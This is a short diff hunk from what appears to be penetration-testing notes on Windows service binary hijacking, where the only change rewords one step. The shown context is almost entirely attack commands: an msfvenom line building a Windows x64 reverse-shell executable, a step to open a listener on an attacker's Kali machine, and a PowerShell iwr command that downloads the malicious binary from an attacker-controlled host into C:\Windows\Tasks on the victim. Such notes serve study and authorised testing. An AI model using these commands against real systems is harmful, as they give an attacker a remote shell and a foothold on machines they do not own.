@@ -119,7 +119,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f exe > Service
 
 2) Open a listener in your kali machine.
 
-3) Transfer and overwrite the Service2.exe file with the malicious binary:
+3) Transfer the malicious executable in victim's machine:
 
 ```
 iwr -Uri http://<ip>:<port>/Service4.exe -Outfile C:\Windows\Tasks\Service4.exe
